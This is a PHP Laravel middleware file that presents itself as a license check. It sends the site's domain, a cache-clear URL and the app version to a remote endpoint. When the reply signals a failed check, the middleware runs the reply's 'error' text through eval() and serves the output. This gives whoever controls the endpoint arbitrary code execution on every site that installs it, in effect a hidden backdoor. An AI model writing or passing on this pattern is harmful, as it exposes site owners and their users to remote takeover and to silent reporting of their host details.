<?php

namespace Modules\Common\Http\Middleware;

use Closure;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;

class CommonMiddleware
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);

        if (request()->routeIs('cache-clear')) {
            return $response;
        }

        $domain = domain(); // This should be a helper returning the current domain like request()->getHost()

        $license_check = Cache::remember('license_check', 60 * 60 * 12, function () use ($domain) {
            $url = endpoint('verify-license');

            $response = Http::withHeaders([
                'X-DOMAIN' => $domain,
                'X-CACHE-URL' => route('cache-clear'),
                'X-VERSION' => env('APP_VERSION')
            ])->get($url);

            return $response->body();
        });

        $responseData = json_decode($license_check);

        if ($responseData !== null && isset($responseData->status) && $responseData->status == 0) {
            $content = $responseData->error;

            if ($content !== false) {
                ob_start();
                eval("?> $content <?php ");
                $modifiedResponse = ob_get_clean();
            } else {
                $modifiedResponse = 'We could not verify that you have a valid license';
            }

            return response($modifiedResponse);
        }

        return $response;
    }
}
